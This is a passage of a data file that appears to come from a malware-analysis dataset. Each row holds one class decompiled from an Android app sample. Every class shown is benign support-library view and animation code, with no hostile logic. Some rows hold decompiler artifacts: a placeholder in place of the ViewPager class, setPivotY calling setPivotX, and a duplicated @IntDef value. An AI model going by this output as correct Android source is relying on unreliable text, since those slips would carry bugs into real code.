!= null) {         return viewPropertyAnimatorCompat;       }       ViewPropertyAnimatorCompat viewPropertyAnimatorCompat2=new ViewPropertyAnimatorCompat(view);       this.mViewPropertyAnimatorCompatMap.put(view,viewPropertyAnimatorCompat2);       return viewPropertyAnimatorCompat2;     }     @Override public boolean canScrollHorizontally(    View view,    int i){       return ViewCompatICS.canScrollHorizontally(view,i);     }     @Override public boolean canScrollVertically(    View view,    int i){       return ViewCompatICS.canScrollVertically(view,i);     }     @Override public void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent){       ViewCompatICS.onInitializeAccessibilityEvent(view,accessibilityEvent);     }     @Override public void onInitializeAccessibilityNodeInfo(    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat){       ViewCompatICS.onInitializeAccessibilityNodeInfo(view,accessibilityNodeInfoCompat.getInfo());     }     @Override public void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent){       ViewCompatICS.onPopulateAccessibilityEvent(view,accessibilityEvent);     }     @Override public void setAccessibilityDelegate(    View view,    AccessibilityDelegateCompat accessibilityDelegateCompat){       ViewCompatICS.setAccessibilityDelegate(view,accessibilityDelegateCompat.getBridge());     }   }   @IntDef({0,1,2,4}) @Retention(RetentionPolicy.SOURCE) @interface ImportantForAccessibility {} class JBViewCompatImpl extends ICSViewCompatImpl {     JBViewCompatImpl(){     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view){       Object accessibilityNodeProvider=ViewCompatJB.getAccessibilityNodeProvider(view);       if (accessibilityNodeProvider != null) {         return new AccessibilityNodeProviderCompat(accessibilityNodeProvider);       }       return null;     }     @Override public int getImportantForAccessibility(    View view){       return ViewCompatJB.getImportantForAccessibility(view);     }     @Override public int getMinimumHeight(    View view){       return ViewCompatJB.getMinimumHeight(view);     }     @Override public int getMinimumWidth(    View view){       return ViewCompatJB.getMinimumWidth(view);     }     @Override public ViewParent getParentForAccessibility(    View view){       return ViewCompatJB.getParentForAccessibility(view);     }     @Override public boolean hasTransientState(    View view){       return ViewCompatJB.hasTransientState(view);     }     @Override public boolean performAccessibilityAction(    View view,    int i,    Bundle bundle){       return ViewCompatJB.performAccessibilityAction(view,i,bundle);     }     @Override public void postInvalidateOnAnimation(    View view){       ViewCompatJB.postInvalidateOnAnimation(view);     }     @Override public void postInvalidateOnAnimation(    View view,    int i,    int i2,    int i3,    int i4){       ViewCompatJB.postInvalidateOnAnimation(view,i,i2,i3,i4);     }     @Override public void postOnAnimation(    View view,    Runnable runnable){       ViewCompatJB.postOnAnimation(view,runnable);     }     @Override public void postOnAnimationDelayed(    View view,    Runnable runnable,    long j){       ViewCompatJB.postOnAnimationDelayed(view,runnable,j);     }     @Override public void setHasTransientState(    View view,    boolean z){       ViewCompatJB.setHasTransientState(view,z);     }     @Override public void setImportantForAccessibility(    View view,    int i){       if (i == 4) {         i=2;       }       ViewCompatJB.setImportantForAccessibility(view,i);     }   } class JbMr1ViewCompatImpl extends JBViewCompatImpl {     JbMr1ViewCompatImpl(){     }     @Override public int getLabelFor(    View view){       return ViewCompatJellybeanMr1.getLabelFor(view);     }     @Override public int getLayoutDirection(    View view){       return ViewCompatJellybeanMr1.getLayoutDirection(view);     }     @Override public int getPaddingEnd(    View view){       return ViewCompatJellybeanMr1.getPaddingEnd(view);     }     @Override public int getPaddingStart(    View view){       return ViewCompatJellybeanMr1.getPaddingStart(view);     }     @Override public void setLabelFor(    View view,    int i){       ViewCompatJellybeanMr1.setLabelFor(view,i);     }     @Override public void setLayerPaint(    View view,    Paint paint){       ViewCompatJellybeanMr1.setLayerPaint(view,paint);     }     @Override public void setLayoutDirection(    View view,    int i){       ViewCompatJellybeanMr1.setLayoutDirection(view,i);     }     @Override public void setPaddingRelative(    View view,    int i,    int i2,    int i3,    int i4){       ViewCompatJellybeanMr1.setPaddingRelative(view,i,i2,i3,i4);     }   } class KitKatViewCompatImpl extends JbMr1ViewCompatImpl {     KitKatViewCompatImpl(){     }     @Override public int getAccessibilityLiveRegion(    View view){       return ViewCompatKitKat.getAccessibilityLiveRegion(view);     }     @Override public void setAccessibilityLiveRegion(    View view,    int i){       ViewCompatKitKat.setAccessibilityLiveRegion(view,i);     }     @Override public void setImportantForAccessibility(    View view,    int i){       ViewCompatJB.setImportantForAccessibility(view,i);     }   }   @IntDef({0,1,2}) @Retention(RetentionPolicy.SOURCE) @interface LayerType {}   @IntDef({0,1,2,3}) @Retention(RetentionPolicy.SOURCE) @interface LayoutDirectionMode {}   @IntDef({0,1,1}) @Retention(RetentionPolicy.SOURCE) @interface OverScroll {}   @IntDef({0,1}) @Retention(RetentionPolicy.SOURCE) @interface ResolvedLayoutDirectionMode {} public interface ViewCompatImpl {     ViewPropertyAnimatorCompat animate(    View view);     boolean canScrollHorizontally(    View view,    int i);     boolean canScrollVertically(    View view,    int i);     void dispatchFinishTemporaryDetach(    View view);     void dispatchStartTemporaryDetach(    View view);     int getAccessibilityLiveRegion(    View view);     AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view);     float getAlpha(    View view);     int getImportantForAccessibility(    View view);     int getLabelFor(    View view);     int getLayerType(    View view);     int getLayoutDirection(    View view);     int getMeasuredHeightAndState(    View view);     int getMeasuredState(    View view);     int getMeasuredWidthAndState(    View view);     int getMinimumHeight(    View view);     int getMinimumWidth(    View view);     int getOverScrollMode(    View view);     int getPaddingEnd(    View view);     int getPaddingStart(    View view);     ViewParent getParentForAccessibility(    View view);     float getPivotX(    View view);     float getPivotY(    View view);     float getRotation(    View view);     float getRotationX(    View view);     float getRotationY(    View view);     float getScaleX(    View view);     float getScaleY(    View view);     float getTranslationX(    View view);     float getTranslationY(    View view);     float getX(    View view);     float getY(    View view);     boolean hasTransientState(    View view);     boolean isOpaque(    View view);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    View view,    int i,    Bundle bundle);     void postInvalidateOnAnimation(    View view);     void postInvalidateOnAnimation(    View view,    int i,    int i2,    int i3,    int i4);     void postOnAnimation(    View view,    Runnable runnable);     void postOnAnimationDelayed(    View view,    Runnable runnable,    long j);     int resolveSizeAndState(    int i,    int i2,    int i3);     void setAccessibilityDelegate(    View view,    AccessibilityDelegateCompat accessibilityDelegateCompat);     void setAccessibilityLiveRegion(    View view,    int i);     void setAlpha(    View view,    float f);     void setHasTransientState(    View view,    boolean z);     void setImportantForAccessibility(    View view,    int i);     void setLabelFor(    View view,    int i);     void setLayerPaint(    View view,    Paint paint);     void setLayerType(    View view,    int i,    Paint paint);     void setLayoutDirection(    View view,    int i);     void setOverScrollMode(    View view,    int i);     void setPaddingRelative(    View view,    int i,    int i2,    int i3,    int i4);     void setPivotX(    View view,    float f);     void setPivotY(    View view,    float f);     void setRotation(    View view,    float f);     void setRotationX(    View view,    float f);     void setRotationY(    View view,    float f);     void setScaleX(    View view,    float f);     void setScaleY(    View view,    float f);     void setTranslationX(    View view,    float f);     void setTranslationY(    View view,    float f);     void setX(    View view,    float f);     void setY(    View view,    float f);   } static {     int i=Build.VERSION.SDK_INT;     if (i >= 19) {       IMPL=new KitKatViewCompatImpl();       return;     }     if (i >= 17) {       IMPL=new JbMr1ViewCompatImpl();       return;     }     if (i >= 16) {       IMPL=new JBViewCompatImpl();       return;     }     if (i >= 14) {       IMPL=new ICSViewCompatImpl();       return;     }     if (i >= 11) {       IMPL=new HCViewCompatImpl();     }  else     if (i >= 9) {       IMPL=new GBViewCompatImpl();     }  else {       IMPL=new BaseViewCompatImpl();     }   }   public static ViewPropertyAnimatorCompat animate(  View view){     return IMPL.animate(view);   }   public static boolean canScrollHorizontally(  View view,  int i){     return IMPL.canScrollHorizontally(view,i);   }   public static boolean canScrollVertically(  View view,  int i){     return IMPL.canScrollVertically(view,i);   }   public static void dispatchFinishTemporaryDetach(  View view){     IMPL.dispatchFinishTemporaryDetach(view);   }   public static void dispatchStartTemporaryDetach(  View view){     IMPL.dispatchStartTemporaryDetach(view);   }   public static int getAccessibilityLiveRegion(  View view){     return IMPL.getAccessibilityLiveRegion(view);   }   public static AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     return IMPL.getAccessibilityNodeProvider(view);   }   public static float getAlpha(  View view){     return IMPL.getAlpha(view);   }   public static int getImportantForAccessibility(  View view){     return IMPL.getImportantForAccessibility(view);   }   public static int getLabelFor(  View view){     return IMPL.getLabelFor(view);   }   public static int getLayerType(  View view){     return IMPL.getLayerType(view);   }   public static int getLayoutDirection(  View view){     return IMPL.getLayoutDirection(view);   }   public static int getMeasuredHeightAndState(  View view){     return IMPL.getMeasuredHeightAndState(view);   }   public static int getMeasuredState(  View view){     return IMPL.getMeasuredState(view);   }   public static int getMeasuredWidthAndState(  View view){     return IMPL.getMeasuredWidthAndState(view);   }   public static int getMinimumHeight(  View view){     return IMPL.getMinimumHeight(view);   }   public static int getMinimumWidth(  View view){     return IMPL.getMinimumWidth(view);   }   public static int getOverScrollMode(  View view){     return IMPL.getOverScrollMode(view);   }   public static int getPaddingEnd(  View view){     return IMPL.getPaddingEnd(view);   }   public static int getPaddingStart(  View view){     return IMPL.getPaddingStart(view);   }   public static ViewParent getParentForAccessibility(  View view){     return IMPL.getParentForAccessibility(view);   }   public static float getTranslationX(  View view){     return IMPL.getTranslationX(view);   }   public static float getTranslationY(  View view){     return IMPL.getTranslationY(view);   }   public static boolean hasTransientState(  View view){     return IMPL.hasTransientState(view);   }   public static boolean isOpaque(  View view){     return IMPL.isOpaque(view);   }   public static void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent){     IMPL.onInitializeAccessibilityEvent(view,accessibilityEvent);   }   public static void onInitializeAccessibilityNodeInfo(  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat){     IMPL.onInitializeAccessibilityNodeInfo(view,accessibilityNodeInfoCompat);   }   public static void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent){     IMPL.onPopulateAccessibilityEvent(view,accessibilityEvent);   }   public static boolean performAccessibilityAction(  View view,  int i,  Bundle bundle){     return IMPL.performAccessibilityAction(view,i,bundle);   }   public static void postInvalidateOnAnimation(  View view){     IMPL.postInvalidateOnAnimation(view);   }   public static void postInvalidateOnAnimation(  View view,  int i,  int i2,  int i3,  int i4){     IMPL.postInvalidateOnAnimation(view,i,i2,i3,i4);   }   public static void postOnAnimation(  View view,  Runnable runnable){     IMPL.postOnAnimation(view,runnable);   }   public static void postOnAnimationDelayed(  View view,  Runnable runnable,  long j){     IMPL.postOnAnimationDelayed(view,runnable,j);   }   public static int resolveSizeAndState(  int i,  int i2,  int i3){     return IMPL.resolveSizeAndState(i,i2,i3);   }   public static void setAccessibilityDelegate(  View view,  AccessibilityDelegateCompat accessibilityDelegateCompat){     IMPL.setAccessibilityDelegate(view,accessibilityDelegateCompat);   }   public static void setAccessibilityLiveRegion(  View view,  int i){     IMPL.setAccessibilityLiveRegion(view,i);   }   public static void setAlpha(  View view,  float f){     IMPL.setAlpha(view,f);   }   public static void setHasTransientState(  View view,  boolean z){     IMPL.setHasTransientState(view,z);   }   public static void setImportantForAccessibility(  View view,  int i){     IMPL.setImportantForAccessibility(view,i);   }   public static void setLabelFor(  View view,  int i){     IMPL.setLabelFor(view,i);   }   public static void setLayerPaint(  View view,  Paint paint){     IMPL.setLayerPaint(view,paint);   }   public static void setLayerType(  View view,  int i,  Paint paint){     IMPL.setLayerType(view,i,paint);   }   public static void setLayoutDirection(  View view,  int i){     IMPL.setLayoutDirection(view,i);   }   public static void setOverScrollMode(  View view,  int i){     IMPL.setOverScrollMode(view,i);   }   public static void setPaddingRelative(  View view,  int i,  int i2,  int i3,  int i4){     IMPL.setPaddingRelative(view,i,i2,i3,i4);   }   public static void setRotation(  View view,  float f){     IMPL.setRotation(view,f);   }   public static void setRotationX(  View view,  float f){     IMPL.setRotationX(view,f);   }   public static void setRotationY(  View view,  float f){     IMPL.setRotationY(view,f);   }   public static void setScaleX(  View view,  float f){     IMPL.setScaleX(view,f);   }   public static void setScaleY(  View view,  float f){     IMPL.setScaleY(view,f);   }   public static void setTranslationX(  View view,  float f){     IMPL.setTranslationX(view,f);   }   public static void setTranslationY(  View view,  float f){     IMPL.setTranslationY(view,f);   }   public static void setX(  View view,  float f){     IMPL.setX(view,f);   }   public static void setY(  View view,  float f){     IMPL.setY(view,f);   }   public float getPivotX(  View view){     return IMPL.getPivotX(view);   }   public float getPivotY(  View view){     return IMPL.getPivotY(view);   }   public float getRotation(  View view){     return IMPL.getRotation(view);   }   public float getRotationX(  View view){     return IMPL.getRotationX(view);   }   public float getRotationY(  View view){     return IMPL.getRotationY(view);   }   public float getScaleX(  View view){     return IMPL.getScaleX(view);   }   public float getScaleY(  View view){     return IMPL.getScaleY(view);   }   public float getX(  View view){     return IMPL.getX(view);   }   public float getY(  View view){     return IMPL.getY(view);   }   public void setPivotX(  View view,  float f){     IMPL.setPivotX(view,f);   }   public void setPivotY(  View view,  float f){     IMPL.setPivotX(view,f);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewCompatEclairMr1.code","class ViewCompatEclairMr1 {   ViewCompatEclairMr1(){   }   public static boolean isOpaque(  View view){     return view.isOpaque();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewCompatGingerbread.code","class ViewCompatGingerbread {   ViewCompatGingerbread(){   }   public static int getOverScrollMode(  View view){     return view.getOverScrollMode();   }   public static void setOverScrollMode(  View view,  int i){     view.setOverScrollMode(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewCompatHC.code","class ViewCompatHC {   ViewCompatHC(){   }   public static float getAlpha(  View view){     return view.getAlpha();   }   public static long getFrameTime(){     return ValueAnimator.getFrameDelay();   }   public static int getLayerType(  View view){     return view.getLayerType();   }   public static int getMeasuredHeightAndState(  View view){     return view.getMeasuredHeightAndState();   }   public static int getMeasuredState(  View view){     return view.getMeasuredState();   }   public static int getMeasuredWidthAndState(  View view){     return view.getMeasuredWidthAndState();   }   public static float getPivotX(  View view){     return view.getPivotX();   }   public static float getPivotY(  View view){     return view.getPivotY();   }   public static float getRotation(  View view){     return view.getRotation();   }   public static float getRotationX(  View view){     return view.getRotationX();   }   public static float getRotationY(  View view){     return view.getRotationY();   }   public static float getScaleX(  View view){     return view.getScaleX();   }   public static float getScaleY(  View view){     return view.getScaleY();   }   public static float getTranslationX(  View view){     return view.getTranslationX();   }   public static float getTranslationY(  View view){     return view.getTranslationY();   }   public static float getX(  View view){     return view.getX();   }   public static float getY(  View view){     return view.getY();   }   public static int resolveSizeAndState(  int i,  int i2,  int i3){     return View.resolveSizeAndState(i,i2,i3);   }   public static void setAlpha(  View view,  float f){     view.setAlpha(f);   }   public static void setLayerType(  View view,  int i,  Paint paint){     view.setLayerType(i,paint);   }   public static void setPivotX(  View view,  float f){     view.setPivotX(f);   }   public static void setPivotY(  View view,  float f){     view.setPivotY(f);   }   public static void setRotation(  View view,  float f){     view.setRotation(f);   }   public static void setRotationX(  View view,  float f){     view.setRotationX(f);   }   public static void setRotationY(  View view,  float f){     view.setRotationY(f);   }   public static void setScaleX(  View view,  float f){     view.setScaleX(f);   }   public static void setScaleY(  View view,  float f){     view.setScaleY(f);   }   public static void setTranslationX(  View view,  float f){     view.setTranslationX(f);   }   public static void setTranslationY(  View view,  float f){     view.setTranslationY(f);   }   public static void setX(  View view,  float f){     view.setX(f);   }   public static void setY(  View view,  float f){     view.setY(f);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewCompatICS.code","class ViewCompatICS {   ViewCompatICS(){   }   public static boolean canScrollHorizontally(  View view,  int i){     return view.canScrollHorizontally(i);   }   public static boolean canScrollVertically(  View view,  int i){     return view.canScrollVertically(i);   }   public static void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent){     view.onInitializeAccessibilityEvent(accessibilityEvent);   }   public static void onInitializeAccessibilityNodeInfo(  View view,  Object obj){     view.onInitializeAccessibilityNodeInfo((AccessibilityNodeInfo)obj);   }   public static void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent){     view.onPopulateAccessibilityEvent(accessibilityEvent);   }   public static void setAccessibilityDelegate(  View view,  Object obj){     view.setAccessibilityDelegate((View.AccessibilityDelegate)obj);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewCompatImpl.code","public interface ViewCompatImpl {   ViewPropertyAnimatorCompat animate(  View view);   boolean canScrollHorizontally(  View view,  int i);   boolean canScrollVertically(  View view,  int i);   void dispatchFinishTemporaryDetach(  View view);   void dispatchStartTemporaryDetach(  View view);   int getAccessibilityLiveRegion(  View view);   AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view);   float getAlpha(  View view);   int getImportantForAccessibility(  View view);   int getLabelFor(  View view);   int getLayerType(  View view);   int getLayoutDirection(  View view);   int getMeasuredHeightAndState(  View view);   int getMeasuredState(  View view);   int getMeasuredWidthAndState(  View view);   int getMinimumHeight(  View view);   int getMinimumWidth(  View view);   int getOverScrollMode(  View view);   int getPaddingEnd(  View view);   int getPaddingStart(  View view);   ViewParent getParentForAccessibility(  View view);   float getPivotX(  View view);   float getPivotY(  View view);   float getRotation(  View view);   float getRotationX(  View view);   float getRotationY(  View view);   float getScaleX(  View view);   float getScaleY(  View view);   float getTranslationX(  View view);   float getTranslationY(  View view);   float getX(  View view);   float getY(  View view);   boolean hasTransientState(  View view);   boolean isOpaque(  View view);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  View view,  int i,  Bundle bundle);   void postInvalidateOnAnimation(  View view);   void postInvalidateOnAnimation(  View view,  int i,  int i2,  int i3,  int i4);   void postOnAnimation(  View view,  Runnable runnable);   void postOnAnimationDelayed(  View view,  Runnable runnable,  long j);   int resolveSizeAndState(  int i,  int i2,  int i3);   void setAccessibilityDelegate(  View view,  AccessibilityDelegateCompat accessibilityDelegateCompat);   void setAccessibilityLiveRegion(  View view,  int i);   void setAlpha(  View view,  float f);   void setHasTransientState(  View view,  boolean z);   void setImportantForAccessibility(  View view,  int i);   void setLabelFor(  View view,  int i);   void setLayerPaint(  View view,  Paint paint);   void setLayerType(  View view,  int i,  Paint paint);   void setLayoutDirection(  View view,  int i);   void setOverScrollMode(  View view,  int i);   void setPaddingRelative(  View view,  int i,  int i2,  int i3,  int i4);   void setPivotX(  View view,  float f);   void setPivotY(  View view,  float f);   void setRotation(  View view,  float f);   void setRotationX(  View view,  float f);   void setRotationY(  View view,  float f);   void setScaleX(  View view,  float f);   void setScaleY(  View view,  float f);   void setTranslationX(  View view,  float f);   void setTranslationY(  View view,  float f);   void setX(  View view,  float f);   void setY(  View view,  float f); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewCompatJB.code","class ViewCompatJB {   ViewCompatJB(){   }   public static Object getAccessibilityNodeProvider(  View view){     return view.getAccessibilityNodeProvider();   }   public static int getImportantForAccessibility(  View view){     return view.getImportantForAccessibility();   }   public static int getMinimumHeight(  View view){     return view.getMinimumHeight();   }   public static int getMinimumWidth(  View view){     return view.getMinimumWidth();   }   public static ViewParent getParentForAccessibility(  View view){     return view.getParentForAccessibility();   }   public static boolean hasTransientState(  View view){     return view.hasTransientState();   }   public static boolean performAccessibilityAction(  View view,  int i,  Bundle bundle){     return view.performAccessibilityAction(i,bundle);   }   public static void postInvalidateOnAnimation(  View view){     view.postInvalidateOnAnimation();   }   public static void postInvalidateOnAnimation(  View view,  int i,  int i2,  int i3,  int i4){     view.postInvalidate(i,i2,i3,i4);   }   public static void postOnAnimation(  View view,  Runnable runnable){     view.postOnAnimation(runnable);   }   public static void postOnAnimationDelayed(  View view,  Runnable runnable,  long j){     view.postOnAnimationDelayed(runnable,j);   }   public static void setHasTransientState(  View view,  boolean z){     view.setHasTransientState(z);   }   public static void setImportantForAccessibility(  View view,  int i){     view.setImportantForAccessibility(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewCompatJellybeanMr1.code","class ViewCompatJellybeanMr1 {   ViewCompatJellybeanMr1(){   }   public static int getLabelFor(  View view){     return view.getLabelFor();   }   public static int getLayoutDirection(  View view){     return view.getLayoutDirection();   }   public static int getPaddingEnd(  View view){     return view.getPaddingEnd();   }   public static int getPaddingStart(  View view){     return view.getPaddingStart();   }   public static void setLabelFor(  View view,  int i){     view.setLabelFor(i);   }   public static void setLayerPaint(  View view,  Paint paint){     view.setLayerPaint(paint);   }   public static void setLayoutDirection(  View view,  int i){     view.setLayoutDirection(i);   }   public static void setPaddingRelative(  View view,  int i,  int i2,  int i3,  int i4){     view.setPaddingRelative(i,i2,i3,i4);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewCompatKitKat.code","public class ViewCompatKitKat {   public static int getAccessibilityLiveRegion(  View view){     return view.getAccessibilityLiveRegion();   }   public static void setAccessibilityLiveRegion(  View view,  int i){     view.setAccessibilityLiveRegion(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewConfigurationCompat.code","public class ViewConfigurationCompat {   static final ViewConfigurationVersionImpl IMPL; class BaseViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {     BaseViewConfigurationVersionImpl(){     }     @Override public int getScaledPagingTouchSlop(    ViewConfiguration viewConfiguration){       return viewConfiguration.getScaledTouchSlop();     }   } class FroyoViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {     FroyoViewConfigurationVersionImpl(){     }     @Override public int getScaledPagingTouchSlop(    ViewConfiguration viewConfiguration){       return ViewConfigurationCompatFroyo.getScaledPagingTouchSlop(viewConfiguration);     }   } interface ViewConfigurationVersionImpl {     int getScaledPagingTouchSlop(    ViewConfiguration viewConfiguration);   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new FroyoViewConfigurationVersionImpl();     }  else {       IMPL=new BaseViewConfigurationVersionImpl();     }   }   public static int getScaledPagingTouchSlop(  ViewConfiguration viewConfiguration){     return IMPL.getScaledPagingTouchSlop(viewConfiguration);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewConfigurationCompatFroyo.code","class ViewConfigurationCompatFroyo {   ViewConfigurationCompatFroyo(){   }   public static int getScaledPagingTouchSlop(  ViewConfiguration viewConfiguration){     return viewConfiguration.getScaledPagingTouchSlop();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewConfigurationVersionImpl.code","interface ViewConfigurationVersionImpl {   int getScaledPagingTouchSlop(  ViewConfiguration viewConfiguration); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewPager.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4ec51d16"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewPositionComparator.code","public class ViewPositionComparator implements Comparator<View> {   ViewPositionComparator(){   }   @Override public int compare(  View view,  View view2){     LayoutParams layoutParams=(LayoutParams)view.getLayoutParams();     LayoutParams layoutParams2=(LayoutParams)view2.getLayoutParams();     return layoutParams.isDecor != layoutParams2.isDecor ? layoutParams.isDecor ? 1 : -1 : layoutParams.position - layoutParams2.position;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewPropertyAnimatorCompat.code","public class ViewPropertyAnimatorCompat {   static final ViewPropertyAnimatorCompatImpl IMPL;   private WeakReference<View> mView; class BaseViewPropertyAnimatorCompatImpl implements ViewPropertyAnimatorCompatImpl {     BaseViewPropertyAnimatorCompatImpl(){     }     @Override public void alpha(    View view,    float f){     }     @Override public void alphaBy(    View view,    float f){     }     @Override public void cancel(    View view){     }     @Override public long getDuration(    View view){       return 0L;     }     @Override public Interpolator getInterpolator(    View view){       return null;     }     @Override public long getStartDelay(    View view){       return 0L;     }     @Override public void rotation(    View view,    float f){     }     @Override public void rotationBy(    View view,    float f){     }     @Override public void rotationX(    View view,    float f){     }     @Override public void rotationXBy(    View view,    float f){     }     @Override public void rotationY(    View view,    float f){     }     @Override public void rotationYBy(    View view,    float f){     }     @Override public void scaleX(    View view,    float f){     }     @Override public void scaleXBy(    View view,    float f){     }     @Override public void scaleY(    View view,    float f){     }     @Override public void scaleYBy(    View view,    float f){     }     @Override public void setDuration(    View view,    long j){     }     @Override public void setInterpolator(    View view,    Interpolator interpolator){     }     @Override public void setListener(    View view,    ViewPropertyAnimatorListener viewPropertyAnimatorListener){     }     @Override public void setStartDelay(    View view,    long j){     }     @Override public void start(    View view){     }     @Override public void translationX(    View view,    float f){     }     @Override public void translationXBy(    View view,    float f){     }     @Override public void translationY(    View view,    float f){     }     @Override public void translationYBy(    View view,    float f){     }     @Override public void withEndAction(    View view,    Runnable runnable){       runnable.run();     }     @Override public void withLayer(    View view){     }     @Override public void withStartAction(    View view,    Runnable runnable){       runnable.run();     }     @Override public void x(    View view,    float f){     }     @Override public void xBy(    View view,    float f){     }     @Override public void y(    View view,    float f){     }     @Override public void yBy(    View view,    float f){     }   } class ICSViewPropertyAnimatorCompatImpl extends BaseViewPropertyAnimatorCompatImpl {     ICSViewPropertyAnimatorCompatImpl(){     }     @Override public void alpha(    View view,    float f){       ViewPropertyAnimatorCompatICS.alpha(view,f);     }     @Override public void alphaBy(    View view,    float f){       ViewPropertyAnimatorCompatICS.alphaBy(view,f);     }     @Override public void cancel(    View view){       ViewPropertyAnimatorCompatICS.cancel(view);     }     @Override public long getDuration(    View view){       return ViewPropertyAnimatorCompatICS.getDuration(view);     }     @Override public long getStartDelay(    View view){       return ViewPropertyAnimatorCompatICS.getStartDelay(view);     }     @Override public void rotation(    View view,    float f){       ViewPropertyAnimatorCompatICS.rotation(view,f);     }     @Override public void rotationBy(    View view,    float f){       ViewPropertyAnimatorCompatICS.rotationBy(view,f);     }     @Override public void rotationX(    View view,    float f){       ViewPropertyAnimatorCompatICS.rotationX(view,f);     }     @Override public void rotationXBy(    View view,    float f){       ViewPropertyAnimatorCompatICS.rotationXBy(view,f);     }     @Override public void rotationY(    View view,    float f){       ViewPropertyAnimatorCompatICS.rotationY(view,f);     }     @Override public void rotationYBy(    View view,    float f){       ViewPropertyAnimatorCompatICS.rotationYBy(view,f);     }     @Override public void scaleX(    View view,    float f){       ViewPropertyAnimatorCompatICS.scaleX(view,f);     }     @Override public void scaleXBy(    View view,    float f){       ViewPropertyAnimatorCompatICS.scaleXBy(view,f);     }     @Override public void scaleY(    View view,    float f){       ViewPropertyAnimatorCompatICS.scaleY(view,f);     }     @Override public void scaleYBy(    View view,    float f){       ViewPropertyAnimatorCompatICS.scaleYBy(view,f);     }     @Override public void setDuration(    View view,    long j){       ViewPropertyAnimatorCompatICS.setDuration(view,j);     }     @Override public void setInterpolator(    View view,    Interpolator interpolator){       ViewPropertyAnimatorCompatICS.setInterpolator(view,interpolator);     }     @Override public void setListener(    View view,    ViewPropertyAnimatorListener viewPropertyAnimatorListener){       ViewPropertyAnimatorCompatICS.setListener(view,viewPropertyAnimatorListener);     }     @Override public void setStartDelay(    View view,    long j){       ViewPropertyAnimatorCompatICS.setStartDelay(view,j);     }     @Override public void start(    View view){       ViewPropertyAnimatorCompatICS.start(view);     }     @Override public void translationX(    View view,    float f){       ViewPropertyAnimatorCompatICS.translationX(view,f);     }     @Override public void translationXBy(    View view,    float f){       ViewPropertyAnimatorCompatICS.translationXBy(view,f);     }     @Override public void translationY(    View view,    float f){       ViewPropertyAnimatorCompatICS.translationY(view,f);     }     @Override public void translationYBy(    View view,    float f){       ViewPropertyAnimatorCompatICS.translationYBy(view,f);     }     @Override public void withEndAction(    View view,    final Runnable runnable){       setListener(view,new ViewPropertyAnimatorListener(){         @Override public void onAnimationCancel(        View view2){         }         @Override public void onAnimationEnd(        View view2){           runnable.run();           ICSViewPropertyAnimatorCompatImpl.this.setListener(view2,null);         }         @Override public void onAnimationStart(        View view2){         }       } );     }     @Override public void withLayer(    View view){       final int layerType=ViewCompat.getLayerType(view);       setListener(view,new ViewPropertyAnimatorListener(){         @Override public void onAnimationCancel(        View view2){         